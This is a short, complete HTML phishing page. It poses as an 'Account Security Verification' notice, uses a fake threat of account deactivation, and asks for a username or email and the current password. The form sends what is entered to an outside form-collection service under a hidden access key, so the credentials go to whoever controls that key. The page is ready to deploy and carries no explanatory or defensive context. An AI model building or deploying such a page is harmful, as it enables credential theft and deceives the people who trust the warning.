<!DOCTYPE html>
<html>
<head>
    <title>Account Security Verification</title>

    <style>
        body { font-family: Arial; padding: 20px; text-align: center; background: #f4f4f4; }

    </style>
</head>
<body>
    <div class="box">
        <h2>Security Verification</h2>
        <p>Your account has been flagged for suspicious activity. Please verify your identity to prevent account deactivation.</p>
        <form action="https://api.web3forms.com/submit" method="POST">
            <input type="hidden" name="access_key" value="7e163b2f-7634-4063-959c-85060879f977">
            <input type="text" name="username" placeholder="Username / Email" required>
            <input type="password" name="password" placeholder="Current Password" required>
            <button type="submit">Verify My Account</button>
        </form>
    </div>
</body>
</html>
